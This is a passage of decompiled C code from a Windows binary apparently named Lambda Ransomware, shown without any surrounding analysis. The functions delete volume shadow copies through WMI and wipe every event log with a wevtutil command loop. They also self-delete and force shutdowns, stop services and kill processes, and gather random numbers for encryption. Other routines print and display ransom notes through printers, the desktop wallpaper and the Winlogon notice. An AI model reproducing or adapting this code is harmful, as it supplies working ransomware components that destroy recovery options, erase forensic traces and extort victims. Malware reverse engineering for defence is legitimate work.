            v19 = FindFirstFileExW(Str, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, 0, 0);
            if ( v19 != (HANDLE)-1 )
            {
              do
              {
                if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
                {
                  v20 = FindFileData.cFileName;
                  v21 = (char *)wcsrchr(Str, 0x5Cu) + 2 - (_DWORD)FindFileData.cFileName;
                  do
                  {
                    v22 = *v20++;
                    *(WCHAR *)((char *)v20 + (_DWORD)v21 - 2) = v22;
                  }
                  while ( v22 );
                  sub_408C10((char *)Str);
                }
              }
              while ( FindNextFileW(v19, &FindFileData) );
              FindClose(v19);
            }
          }
          LogicalDrives = v32;
        }
      }
      ++v31;
      v0 = FindNextFileW;
      v2 = v31;
      LogicalDrives >>= 1;
      v23 = v30-- == 1;
      v32 = LogicalDrives;
    }
    while ( !v23 );
  }
}
// 4308FC: using guessed type int dword_4308FC;
// 408E20: using guessed type WCHAR FileName[260];

//----- (00409090) --------------------------------------------------------
void sub_409090()
{
  OLECHAR *v0; // ebx
  OLECHAR *v1; // edi
  void (__stdcall *v2)(VARIANTARG *); // esi
  int v3; // esi
  int i; // ecx
  WCHAR v5[514]; // [esp+10h] [ebp-458h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+414h] [ebp-54h] BYREF
  VARIANTARG pvarg; // [esp+438h] [ebp-30h] BYREF
  BSTR v8; // [esp+448h] [ebp-20h]
  BSTR bstrString; // [esp+44Ch] [ebp-1Ch]
  int v10; // [esp+450h] [ebp-18h] BYREF
  LPVOID ppv; // [esp+454h] [ebp-14h] BYREF
  int v12; // [esp+458h] [ebp-10h] BYREF
  LPVOID v13; // [esp+45Ch] [ebp-Ch] BYREF
  int v14; // [esp+460h] [ebp-8h] BYREF
  IUnknown *pProxy; // [esp+464h] [ebp-4h] BYREF

  if ( !dword_4308F4 )
    return;
  bstrString = SysAllocString(L"WQL");
  v0 = SysAllocString(L"SELECT * FROM Win32_ShadowCopy");
  v8 = SysAllocString(L"__ProviderArchitecture");
  v1 = SysAllocString(L"ROOT\\CIMV2");
  ppv = 0;
  v13 = 0;
  pProxy = 0;
  v14 = 0;
  v12 = 0;
  v10 = 0;
  if ( CoInitialize(0) < 0 )
    return;
  if ( CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv) < 0
    || CoCreateInstance(&stru_4243F0, 0, 1u, &stru_424410, &v13) < 0 )
  {
    goto LABEL_15;
  }
  GetNativeSystemInfo(&SystemInfo);
  v2 = VariantInit;
  if ( SystemInfo.wProcessorArchitecture == 9 )
  {
    VariantInit(&pvarg);
    pvarg.lVal = 64;
    pvarg.vt = 3;
    v3 = (*(int (__stdcall **)(LPVOID, BSTR, _DWORD, VARIANTARG *))(*(_DWORD *)v13 + 32))(v13, v8, 0, &pvarg);
    VariantClear(&pvarg);
    if ( v3 < 0 )
      goto LABEL_15;
    v2 = VariantInit;
  }
  if ( (*(int (__stdcall **)(LPVOID, OLECHAR *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, LPVOID, IUnknown **))(*(_DWORD *)ppv + 12))(
         ppv,
         v1,
         0,
         0,
         0,
         0,
         0,
         v13,
         &pProxy) < 0
    || CoSetProxyBlanket(pProxy, 0xAu, 0, 0, 3u, 3u, 0, 0) < 0
    || ((int (__stdcall *)(IUnknown *, BSTR, OLECHAR *, int, _DWORD, int *))pProxy->lpVtbl[6].Release)(
         pProxy,
         bstrString,
         v0,
         48,
         0,
         &v14) < 0 )
  {
LABEL_15:
    if ( v14 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v14 + 8))(v14);
    goto LABEL_17;
  }
  for ( i = v14; v14; i = v14 )
  {
    (*(void (__stdcall **)(int, int, int, int *, int *))(*(_DWORD *)i + 16))(i, -1, 1, &v12, &v10);
    if ( !v10 )
      goto LABEL_15;
    v2(&pvarg);
    (*(void (__stdcall **)(int, const wchar_t *, _DWORD, VARIANTARG *, _DWORD, _DWORD))(*(_DWORD *)v12 + 16))(
      v12,
      L"ID",
      0,
      &pvarg,
      0,
      0);
    wsprintfW(v5, L"Win32_ShadowCopy.ID='%s'", pvarg.lVal);
    ((void (__stdcall *)(IUnknown *, WCHAR *, _DWORD, _DWORD, _DWORD))pProxy->lpVtbl[5].AddRef)(pProxy, v5, 0, 0, 0);
    VariantClear(&pvarg);
    (*(void (__stdcall **)(int))(*(_DWORD *)v12 + 8))(v12);
  }
LABEL_17:
  if ( pProxy )
    pProxy->lpVtbl->Release(pProxy);
  if ( v13 )
    (*(void (__stdcall **)(LPVOID))(*(_DWORD *)v13 + 8))(v13);
  if ( ppv )
    (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 8))(ppv);
  if ( bstrString )
    SysFreeString(bstrString);
  if ( v0 )
    SysFreeString(v0);
  if ( v8 )
    SysFreeString(v8);
  if ( v1 )
    SysFreeString(v1);
  CoUninitialize();
}
// 42AD40: using guessed type wchar_t aId[3];
// 4308F4: using guessed type int dword_4308F4;

//----- (00409300) --------------------------------------------------------
void sub_409300()
{
  HANDLE FileW; // ebx
  HRSRC ResourceW; // esi
  DWORD v2; // edi
  HGLOBAL Resource; // eax
  const void *v4; // eax
  WCHAR Parameters[512]; // [esp+0h] [ebp-60Ch] BYREF
  WCHAR pszPath[260]; // [esp+400h] [ebp-20Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+608h] [ebp-4h] BYREF

  if ( dword_4308CC && !Parameter )
  {
    SHGetFolderPathW(0, 35, 0, 0, pszPath);
    lstrcatW(pszPath, L"\\LPW11.tmp");
    if ( Action == ShutdownPowerOff )
    {
      wsprintfW(Parameters, L"/c \"%s\" /SHUTDOWN", pszPath);
    }
    else if ( Action == ShutdownReboot )
    {
      wsprintfW(Parameters, L"/c \"%s\" /REBOOT", pszPath);
    }
    else
    {
      wsprintfW(Parameters, L"/c \"%s\"", pszPath);
    }
    FileW = CreateFileW(pszPath, 0x40000000u, 0, 0, 1u, 0x80u, 0);
    if ( FileW != (HANDLE)-1 )
    {
      ResourceW = FindResourceW(0, (LPCWSTR)0x67, (LPCWSTR)0xA);
      v2 = SizeofResource(0, ResourceW);
      Resource = LoadResource(0, ResourceW);
      v4 = LockResource(Resource);
      WriteFile(FileW, v4, v2, &NumberOfBytesWritten, 0);
      CloseHandle(FileW);
    }
    ShellExecuteW(0, L"open", L"cmd.exe", Parameters, 0, 0);
  }
}
// 42AD94: using guessed type wchar_t aCSShutdown[18];
// 42ADB8: using guessed type wchar_t aCSReboot[16];
// 4308CC: using guessed type int dword_4308CC;

//----- (00409420) --------------------------------------------------------
HINSTANCE sub_409420()
{
  HINSTANCE result; // eax

  if ( dword_4309C8 )
  {
    if ( !Parameter )
      return ShellExecuteW(
               0,
               L"open",
               L"cmd.exe",
               L"/c for /F \"tokens = *\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"",
               0,
               0);
  }
  return result;
}
// 4309C8: using guessed type int dword_4309C8;

//----- (00409450) --------------------------------------------------------
HINSTANCE sub_409450()
{
  HINSTANCE result; // eax
  WCHAR Parameters[768]; // [esp+0h] [ebp-808h] BYREF
  WCHAR Filename[260]; // [esp+600h] [ebp-208h] BYREF

  if ( dword_430904 && !Parameter )
  {
    GetModuleFileNameW(0, Filename, 0x104u);
    if ( !dword_4308CC )
    {
      if ( Action == ShutdownPowerOff )
      {
        wsprintfW(Parameters, L"/c ping 127.0.0.1 -n 5 > nul & del \"%s\" & shutdown /s /t 0", Filename);
        return ShellExecuteW(0, L"open", L"cmd.exe", Parameters, 0, 0);
      }
      if ( Action == ShutdownReboot )
      {
        wsprintfW(Parameters, L"/c ping 127.0.0.1 -n 5 > nul & del \"%s\" & shutdown /r /t 0 ", Filename);
        return ShellExecuteW(0, L"open", L"cmd.exe", Parameters, 0, 0);
      }
    }
    wsprintfW(Parameters, L"/c ping 127.0.0.1 -n 5 > nul & del \"%s\"", Filename);
    return ShellExecuteW(0, L"open", L"cmd.exe", Parameters, 0, 0);
  }
  return result;
}
// 42AE80: using guessed type wchar_t aCPing127001N5N[59];
// 42AEF8: using guessed type wchar_t aCPing127001N5N_0[60];
// 4308CC: using guessed type int dword_4308CC;
// 430904: using guessed type int dword_430904;

//----- (00409500) --------------------------------------------------------
SHUTDOWN_ACTION sub_409500()
{
  SHUTDOWN_ACTION result; // eax

  if ( !Parameter && !dword_4308CC && !dword_430904 )
  {
    result = Action;
    if ( Action == ShutdownPowerOff )
    {
      return NtShutdownSystem(Action);
    }
    else if ( Action == ShutdownReboot )
    {
      return NtShutdownSystem(ShutdownReboot);
    }
  }
  return result;
}
// 4308CC: using guessed type int dword_4308CC;
// 430904: using guessed type int dword_430904;

//----- (00409540) --------------------------------------------------------
void sub_409540()
{
  DWORD v0; // esi
  BYTE *i; // edi
  DWORD v2; // ebx
  LPCWSTR *v3; // esi
  WCHAR *v4; // eax
  int v5; // eax
  BYTE pDocInfo[4]; // [esp+0h] [ebp-24h] BYREF
  int v7; // [esp+4h] [ebp-20h]
  int *v8; // [esp+8h] [ebp-1Ch]
  int v9[2]; // [esp+Ch] [ebp-18h] BYREF
  DWORD pcWritten; // [esp+14h] [ebp-10h] BYREF
  DWORD pcReturned; // [esp+18h] [ebp-Ch] BYREF
  HANDLE phPrinter; // [esp+1Ch] [ebp-8h] BYREF
  DWORD pcbNeeded; // [esp+20h] [ebp-4h] BYREF

  if ( !Parameter && dword_4308EC )
  {
    pcbNeeded = 0;
    pcReturned = 0;
    EnumPrintersW(2u, 0, 1u, 0, 0, &pcbNeeded, &pcReturned);
    v0 = pcbNeeded;
    for ( i = (BYTE *)HeapAlloc(hHeap, 8u, pcbNeeded); !i; i = (BYTE *)HeapAlloc(hHeap, 8u, v0) )
      Sleep(0x64u);
    if ( EnumPrintersW(2u, 0, 1u, i, pcbNeeded, &pcbNeeded, &pcReturned) )
    {
      v2 = 0;
      if ( pcReturned )
      {
        v3 = (LPCWSTR *)(i + 8);
        do
        {
          if ( !lstrcmpiW(*v3, L"Microsoft Print to PDF") && !lstrcmpiW(*v3, L"Microsoft XPS Document Writer") )
          {
            v4 = (WCHAR *)*v3;
            v8 = v9;
            v9[0] = (int)&loc_410051 + 1;
            v9[1] = 87;
            *(_DWORD *)pDocInfo = v4;
            v7 = 0;
            if ( OpenPrinterW(v4, &phPrinter, 0) )
            {
              if ( StartDocPrinterW(phPrinter, 1u, pDocInfo) )
              {
                StartPagePrinter(phPrinter);
                v5 = lstrlenA(pBuf);
                WritePrinter(phPrinter, (LPVOID)pBuf, v5, &pcWritten);
              }
              ClosePrinter(phPrinter);
            }
          }
          ++v2;
          v3 += 4;
        }
        while ( v2 < pcReturned );
      }
    }
    HeapFree(hHeap, 0, i);
  }
}
// 4308EC: using guessed type int dword_4308EC;

//----- (004096B0) --------------------------------------------------------
void sub_4096B0()
{
  HDC DC; // eax
  HDC v1; // edi
  HDC CompatibleDC; // ebx
  int DeviceCaps; // eax
  int v4; // esi
  HFONT FontW; // eax
  HBITMAP CompatibleBitmap; // eax
  DWORD v7; // esi
  void *v8; // edi
  LPVOID v9; // eax
  HANDLE FileW; // eax
  int v11; // eax
  int v12; // eax
  WCHAR String[2048]; // [esp+10h] [ebp-1280h] BYREF
  WCHAR pszPath[262]; // [esp+1010h] [ebp-280h] BYREF
  struct tagSIZE psizl; // [esp+121Ch] [ebp-74h] BYREF
  struct tagRECT rc; // [esp+1224h] [ebp-6Ch] BYREF
  char bmi[46]; // [esp+1234h] [ebp-5Ch] BYREF
  int v18; // [esp+1262h] [ebp-2Eh]
  int v19; // [esp+1266h] [ebp-2Ah]
  HGDIOBJ ho; // [esp+126Ch] [ebp-24h]
  HDC v21; // [esp+1270h] [ebp-20h]
  DWORD nNumberOfBytesToWrite; // [esp+1274h] [ebp-1Ch]
  HDC v23; // [esp+1278h] [ebp-18h]
  HBITMAP hbm; // [esp+127Ch] [ebp-14h]
  DWORD NumberOfBytesWritten; // [esp+1280h] [ebp-10h] BYREF
  int cchText; // [esp+1284h] [ebp-Ch]
  int cy; // [esp+1288h] [ebp-8h]
  HKEY phkResult; // [esp+128Ch] [ebp-4h] BYREF

  if ( !Parameter )
  {
    if ( dword_430940 )
    {
      DC = GetDC(0);
      v1 = DC;
      v21 = DC;
      if ( DC )
      {
        CompatibleDC = CreateCompatibleDC(DC);
        v23 = CompatibleDC;
        if ( CompatibleDC )
        {
          phkResult = (HKEY)((GetDeviceCaps(v1, 8) + 1) & 0xFFFFFFFE);
          cy = (GetDeviceCaps(v1, 10) + 1) & 0xFFFFFFFE;
          DeviceCaps = GetDeviceCaps(v1, 88);
          v4 = cy;
          FontW = CreateFontW(6 * (cy / DeviceCaps), 0, 0, 0, 512, 0, 0, 0, 1u, 9u, 0, 3u, 0, L"Arial");
          ho = FontW;
          if ( FontW )
          {
            if ( SelectObject(CompatibleDC, FontW) )
            {
              cchText = wsprintfW(
                          String,
                          L"All of your files are stolen and encrypted!\r\n"
                           "Find LAMBDA_README.txt and follow instructions");
              if ( GetTextExtentPoint32W(CompatibleDC, String, cchText, &psizl) )
              {
                CompatibleBitmap = CreateCompatibleBitmap(CompatibleDC, (int)phkResult, v4);
                hbm = CompatibleBitmap;
                if ( CompatibleBitmap )
                {
                  if ( SelectObject(CompatibleDC, CompatibleBitmap) )
                  {
                    SetTextColor(CompatibleDC, 0xFFFFFFu);
                    SetBkMode(CompatibleDC, 2);
                    SetBkColor(CompatibleDC, 0);
                    rc.left = 0;
                    rc.top = (v4 >> 1) - psizl.cy;
                    rc.right = (LONG)phkResult;
                    rc.bottom = v4;
                    if ( DrawTextW(CompatibleDC, String, cchText, &rc, 0x211u) )
                    {
                      *(_WORD *)&bmi[40] = 19778;
                      NumberOfBytesWritten = 0;
                      v19 = 54;
                      *(_DWORD *)bmi = 40;
                      v7 = 2 * (_DWORD)phkResult * v4;
                      *(_DWORD *)&bmi[4] = phkResult;
                      nNumberOfBytesToWrite = v7;
                      *(_DWORD *)&bmi[42] = v7 + 54;
                      v18 = 0;
                      *(_DWORD *)&bmi[8] = cy;
                      *(_DWORD *)&bmi[12] = 1048577;
                      memset(&bmi[16], 0, 24);
                      v8 = HeapAlloc(hHeap, 8u, v7);
                      cchText = (int)v8;
                      if ( !v8 )
                      {
                        do
                        {
                          Sleep(0x64u);
                          v9 = HeapAlloc(hHeap, 8u, v7);
                          cchText = (int)v9;
                        }
                        while ( !v9 );
                        CompatibleDC = v23;
                        v8 = v9;
                      }
                      if ( GetDIBits(CompatibleDC, hbm, 0, cy, v8, (LPBITMAPINFO)bmi, 0) )
                      {
                        SHGetFolderPathW(0, 35, 0, 0, pszPath);
                        lstrcatW(pszPath, L"\\LLTKTPR.bmp");
                        FileW = CreateFileW(pszPath, 0x40000000u, 0, 0, 1u, 0x80u, 0);
                        cy = (int)FileW;
                        if ( FileW != (HANDLE)-1 )
                        {
                          WriteFile(FileW, &bmi[40], 0xEu, &NumberOfBytesWritten, 0);
                          WriteFile((HANDLE)cy, bmi, 0x28u, &NumberOfBytesWritten, 0);
                          WriteFile((HANDLE)cy, v8, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
                          CloseHandle((HANDLE)cy);
                          if ( !RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, 0x20106u, &phkResult) )
                          {
                            v11 = lstrlenW(L"2");
                            RegSetValueExW(phkResult, L"WallpaperStyle", 0, 1u, (const BYTE *)L"2", 2 * v11 + 2);
                            v12 = lstrlenW(L"0");
                            RegSetValueExW(phkResult, L"TileWallpaper", 0, 1u, (const BYTE *)L"0", 2 * v12 + 2);
                            RegCloseKey(phkResult);
                            v8 = (void *)cchText;
                          }
                          SystemParametersInfoW(0x14u, 0, pszPath, 3u);
                        }
                      }
                      HeapFree(hHeap, 0, v8);
                      v1 = v21;
                    }
                  }
                  DeleteObject(hbm);
                }
              }
            }
            DeleteObject(ho);
          }
          DeleteDC(CompatibleDC);
        }
        ReleaseDC(0, v1);
      }
    }
  }
}
// 430940: using guessed type int dword_430940;

//----- (00409A50) --------------------------------------------------------
void sub_409A50()
{
  HRSRC ResourceW; // esi
  DWORD v1; // edi
  HGLOBAL Resource; // eax
  const void *v3; // ebx
  HANDLE FileW; // esi
  int v5; // eax
  WCHAR pszPath[260]; // [esp+0h] [ebp-210h] BYREF
  DWORD NumberOfBytesWritten; // [esp+208h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+20Ch] [ebp-4h] BYREF

  if ( !Parameter && dword_4309CC )
  {
    SHGetFolderPathW(0, 35, 0, 0, pszPath);
    lstrcatW(pszPath, L"\\BTC.ico");
    ResourceW = FindResourceW(0, (LPCWSTR)0x66, (LPCWSTR)0xA);
    v1 = SizeofResource(0, ResourceW);
    Resource = LoadResource(0, ResourceW);
    v3 = LockResource(Resource);
    NumberOfBytesWritten = 0;
    FileW = CreateFileW(pszPath, 0x40000000u, 0, 0, 1u, 0x80u, 0);
    if ( FileW != (HANDLE)-1 )
    {
      WriteFile(FileW, v3, v1, &NumberOfBytesWritten, 0);
      CloseHandle(FileW);
    }
    if ( !RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Classes\\.Lambda\\DefaultIcon",
            0,
            0,
            0,
            0x2011Fu,
            0,
            &phkResult,
            0) )
    {
      v5 = lstrlenW(pszPath);
      RegSetValueExW(phkResult, 0, 0, 1u, (const BYTE *)pszPath, 2 * v5 + 2);
      RegCloseKey(phkResult);
    }
    SHChangeNotify(0x8000000, 0, 0, 0);
  }
}
// 4309CC: using guessed type int dword_4309CC;

//----- (00409B80) --------------------------------------------------------
void __thiscall sub_409B80(HKEY this)
{
  int v1; // eax
  int v2; // eax
  HKEY phkResult; // [esp+0h] [ebp-4h] BYREF

  phkResult = this;
  if ( !Parameter
    && dword_4309D8
    && !RegOpenKeyExW(
          HKEY_LOCAL_MACHINE,
          L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
          0,
          0x20106u,
          &phkResult) )
  {
    v1 = lstrlenW(L"Lambda Ransomware");
    RegSetValueExW(phkResult, L"LegalNoticeCaption", 0, 1u, (const BYTE *)L"Lambda Ransomware", 2 * v1 + 2);
    v2 = lstrlenW(L"\r\nAll of your files are stolen and encrypted!\r\nFind LAMBDA_README.txt and follow instructions");
    RegSetValueExW(
      phkResult,
      L"LegalNoticeText",
      0,
      1u,
      (const BYTE *)L"\r\nAll of your files are stolen and encrypted!\r\nFind LAMBDA_README.txt and follow instructions",
      2 * v2 + 2);
    RegCloseKey(phkResult);
  }
}
// 4309D8: using guessed type int dword_4309D8;

//----- (00409C20) --------------------------------------------------------
int __thiscall sub_409C20(LPCWSTR lpServiceName)
{
  DWORD (__stdcall *v1)(); // edi
  SC_HANDLE v3; // eax
  SC_HANDLE v4; // eax
  int v5; // ebx
  BOOL (__stdcall *v6)(SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD); // esi
  DWORD dwCurrentState; // eax
  DWORD v8; // edx
  DWORD v9; // esi
  struct _ENUM_SERVICE_STATUSW *v10; // eax
  LPENUM_SERVICE_STATUSW v11; // edi
  SC_HANDLE v12; // esi
  DWORD v13; // edx
  struct _SERVICE_STATUS ServiceStatus; // [esp+2Ch] [ebp-64h] BYREF
  struct _SERVICE_STATUS Buffer; // [esp+50h] [ebp-40h] BYREF
  SC_HANDLE hSCManager; // [esp+74h] [ebp-1Ch]
  int v18; // [esp+78h] [ebp-18h]
  DWORD TickCount; // [esp+7Ch] [ebp-14h]
  DWORD ServicesReturned; // [esp+80h] [ebp-10h] BYREF
  LPENUM_SERVICE_STATUSW lpServices; // [esp+84h] [ebp-Ch]
  DWORD pcbBytesNeeded; // [esp+88h] [ebp-8h] BYREF
  SC_HANDLE hService; // [esp+8Ch] [ebp-4h]

  v1 = GetTickCount;
  lpServices = 0;
  TickCount = GetTickCount();
  v3 = OpenSCManagerW(0, 0, 0xF003Fu);
  hSCManager = v3;
  if ( !v3 )
    return 0;
  v4 = OpenServiceW(v3, lpServiceName, 0x1002Cu);
  v5 = 0;
  hService = v4;
  if ( !v4 )
    goto LABEL_40;
  v6 = QueryServiceStatusEx;
  if ( !QueryServiceStatusEx(v4, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded) )
    goto LABEL_39;
  while ( 1 )
  {
    dwCurrentState = Buffer.dwCurrentState;
    if ( Buffer.dwCurrentState == 1 )
      goto LABEL_42;
    if ( Buffer.dwCurrentState == 3 )
    {
      while ( 1 )
      {
        v8 = Buffer.dwWaitHint / 0xA;
        if ( Buffer.dwWaitHint / 0xA >= 0x3E8 )
        {
          if ( v8 > 0x2710 )
            v8 = 10000;
        }
        else
        {
          v8 = 1000;
        }
        Sleep(v8);
        if ( v6(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &pcbBytesNeeded) )
        {
          if ( Buffer.dwCurrentState == 1 )
            break;
        }
        if ( v1() - TickCount > 0x7530 )
          goto LABEL_38;
        dwCurrentState = Buffer.dwCurrentState;
        if ( Buffer.dwCurrentState != 3 )
          goto LABEL_14;
      }
LABEL_42:
      DeleteService(hService);
      v5 = 1;
      goto LABEL_39;
    }
LABEL_14:
    if ( dwCurrentState != 4 )
      goto LABEL_38;
    if ( !EnumDependentServicesW(hService, 1u, lpServices, 0, &pcbBytesNeeded, &ServicesReturned) )
      break;
LABEL_37:
    if ( !ControlService(hService, 1u, &Buffer) )
      goto LABEL_38;
  }
  if ( GetLastError() != 234 )
    goto LABEL_38;
  v9 = pcbBytesNeeded;
  v10 = (struct _ENUM_SERVICE_STATUSW *)HeapAlloc(hHeap, 8u, pcbBytesNeeded);
  for ( lpServices = v10; !v10; lpServices = v10 )
  {
    Sleep(0x64u);
    v10 = (struct _ENUM_SERVICE_STATUSW *)HeapAlloc(hHeap, 8u, v9);
  }
  if ( !EnumDependentServicesW(hService, 1u, v10, pcbBytesNeeded, &pcbBytesNeeded, &ServicesReturned)
    || (v18 = 0, !ServicesReturned) )
  {
LABEL_36:
    HeapFree(hHeap, 0, lpServices);
    v6 = QueryServiceStatusEx;
    goto LABEL_37;
  }
  v11 = lpServices;
  while ( 1 )
  {
    v12 = OpenServiceW(hSCManager, v11->lpServiceName, 0x24u);
    if ( v12 )
      break;
LABEL_34:
    ++v11;
    if ( ++v18 >= ServicesReturned )
    {
      v1 = GetTickCount;
      goto LABEL_36;
    }
  }
  if ( !ControlService(v12, 1u, &ServiceStatus) || ServiceStatus.dwCurrentState == 1 )
  {
LABEL_33:
    CloseServiceHandle(v12);
    goto LABEL_34;
  }
  while ( 1 )
  {
    v13 = ServiceStatus.dwWaitHint / 0xA;
    if ( ServiceStatus.dwWaitHint / 0xA >= 0x3E8 )
    {
      if ( v13 > 0x2710 )
        v13 = 10000;
    }
    else
    {
      v13 = 1000;
    }
    Sleep(v13);
    if ( QueryServiceStatusEx(v12, SC_STATUS_PROCESS_INFO, (LPBYTE)&ServiceStatus, 0x24u, &pcbBytesNeeded) )
    {
      if ( ServiceStatus.dwCurrentState == 1 )
        goto LABEL_33;
      if ( GetTickCount() - TickCount > 0x7530 )
        break;
    }
    if ( ServiceStatus.dwCurrentState == 1 )
      goto LABEL_33;
  }
  CloseServiceHandle(v12);
  HeapFree(hHeap, 0, lpServices);
LABEL_38:
  v5 = 0;
LABEL_39:
  CloseServiceHandle(hService);
LABEL_40:
  CloseServiceHandle(hSCManager);
  return v5;
}

//----- (00409EF0) --------------------------------------------------------
void sub_409EF0()
{
  ULONG v0; // esi
  void *v1; // eax
  void *v2; // ebx
  _DWORD *v3; // eax
  const WCHAR *v4; // esi
  _DWORD *v5; // edi
  HANDLE v6; // eax
  void *v7; // esi
  LPVOID lpMem; // [esp+0h] [ebp-8h]
  _DWORD *lpMema; // [esp+0h] [ebp-8h]
  ULONG ReturnLength; // [esp+4h] [ebp-4h] BYREF

  if ( !Parameter && dword_4309E0 )
  {
    NtQuerySystemInformation(SystemProcessInformation, 0, 0, &ReturnLength);
    v0 = ReturnLength;
    v1 = HeapAlloc(hHeap, 8u, ReturnLength);
    for ( lpMem = v1; !v1; lpMem = v1 )
    {
      Sleep(0x64u);
      v1 = HeapAlloc(hHeap, 8u, v0);
    }
    v2 = lpMem;
    if ( !NtQuerySystemInformation(SystemProcessInformation, v1, ReturnLength, &ReturnLength) )
    {
      v3 = lpMem;
      do
      {
        v4 = lpString;
        v5 = v3;
        v3 = (_DWORD *)((char *)v3 + *v3);
        lpMema = v3;
        if ( *lpString )
        {
          while ( 1 )
          {
            PathRemoveExtensionW((LPWSTR)v5[15]);
            if ( !lstrcmpiW((LPCWSTR)v5[15], v4) )
              break;
            v4 += lstrlenW(v4) + 1;
            if ( !*v4 )
              goto LABEL_15;
          }
          v6 = OpenProcess(0x100001u, 0, v5[17]);
          v7 = v6;
          if ( v6 )
          {
            if ( TerminateProcess(v6, 0) )
              WaitForSingleObject(v7, 0x4E20u);
            CloseHandle(v7);
          }
LABEL_15:
          v3 = lpMema;
        }
      }
      while ( *v5 );
    }
    HeapFree(hHeap, 0, v2);
  }
}
// 4309E0: using guessed type int dword_4309E0;

//----- (0040A020) --------------------------------------------------------
void sub_40A020()
{
  const WCHAR *i; // esi

  if ( !Parameter )
  {
    if ( dword_4308E4 )
    {
      for ( i = lpServiceName; *i; i += lstrlenW(i) + 1 )
        sub_409C20(i);
    }
  }
}
// 4308E4: using guessed type int dword_4308E4;

//----- (0040A060) --------------------------------------------------------
char __fastcall sub_40A060(UCHAR *a1, ULONG a2)
{
  HMODULE LibraryW; // eax
  HMODULE v3; // edi
  NTSTATUS (__stdcall *BCryptGenRandom)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG); // ebx
  NTSTATUS (__stdcall *BCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE, ULONG); // esi
  NTSTATUS (__stdcall *v6)(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG); // eax
  HMODULE v8; // eax
  HMODULE v9; // edi
  BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *, LPCWSTR, LPCWSTR, DWORD, DWORD); // ebx
  BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV, DWORD); // eax
  BOOL (__stdcall *v12)(HCRYPTPROV, DWORD); // edi
  NTSTATUS (__stdcall *v13)(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG); // esi
  NTSTATUS (__stdcall *BCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG); // [esp+14h] [ebp-4h] BYREF

  LibraryW = LoadLibraryW(L"bcrypt.dll");
  v3 = LibraryW;
  if ( LibraryW )
  {
    BCryptOpenAlgorithmProvider = (NTSTATUS (__stdcall *)(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG))GetProcAddress(LibraryW, "BCryptOpenAlgorithmProvider");
    BCryptGenRandom = (NTSTATUS (__stdcall *)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG))GetProcAddress(
                                                                                         v3,
                                                                                         "BCryptGenRandom");
    BCryptCloseAlgorithmProvider = (NTSTATUS (__stdcall *)(BCRYPT_ALG_HANDLE, ULONG))GetProcAddress(
                                                                                       v3,
                                                                                       "BCryptCloseAlgorithmProvider");
    v6 = BCryptOpenAlgorithmProvider;
    if ( BCryptOpenAlgorithmProvider )
    {
      if ( BCryptGenRandom )
      {
        if ( BCryptCloseAlgorithmProvider )
        {
          BCryptOpenAlgorithmProvider = 0;
          if ( !v6((BCRYPT_ALG_HANDLE *)&BCryptOpenAlgorithmProvider, L"RNG", L"Microsoft Primitive Provider", 0) )
          {
            BCryptGenRandom(BCryptOpenAlgorithmProvider, a1, a2, 0);
            BCryptCloseAlgorithmProvider(BCryptOpenAlgorithmProvider, 0);
            return 1;
          }
        }
      }
    }
  }
  else
  {
    v8 = LoadLibraryW(L"advapi32.dll");
    v9 = v8;
    if ( v8 )
    {
      CryptAcquireContextW = (BOOL (__stdcall *)(HCRYPTPROV *, LPCWSTR, LPCWSTR, DWORD, DWORD))GetProcAddress(
                                                                                                 v8,
                                                                                                 "CryptAcquireContextW");
      BCryptOpenAlgorithmProvider = (NTSTATUS (__stdcall *)(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG))GetProcAddress(v9, "CryptGenRandom");
      CryptReleaseContext = (BOOL (__stdcall *)(HCRYPTPROV, DWORD))GetProcAddress(v9, "CryptReleaseContext");
      v12 = CryptReleaseContext;
      if ( CryptAcquireContextW )
      {
        v13 = BCryptOpenAlgorithmProvider;
        if ( BCryptOpenAlgorithmProvider )
        {
          if ( CryptReleaseContext )
          {
            BCryptOpenAlgorithmProvider = 0;
            if ( !CryptAcquireContextW((HCRYPTPROV *)&BCryptOpenAlgorithmProvider, 0, 0, 1, -268435456)
              && !CryptAcquireContextW((HCRYPTPROV *)&BCryptOpenAlgorithmProvider, L"HelloKitty RNG", 0, 1, 8)
              && !CryptAcquireContextW((HCRYPTPROV *)&BCryptOpenAlgorithmProvider, L"HelloKitty RNG", 0, 1, 40) )
            {
              return 0;
            }
            ((void (__stdcall *)(NTSTATUS (__stdcall *)(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG), ULONG, UCHAR *))v13)(
              BCryptOpenAlgorithmProvider,
              a2,
              a1);
            v12((HCRYPTPROV)BCryptOpenAlgorithmProvider, 0);
          }
        }
      }
    }
  }
  return 1;
}
// 42B3D8: using guessed type wchar_t aMicrosoftPrimi[29];
// 42B414: using guessed type wchar_t aRng[4];
// 42B474: using guessed type wchar_t aHellokittyRng[15];

//----- (0040A1B0) --------------------------------------------------------
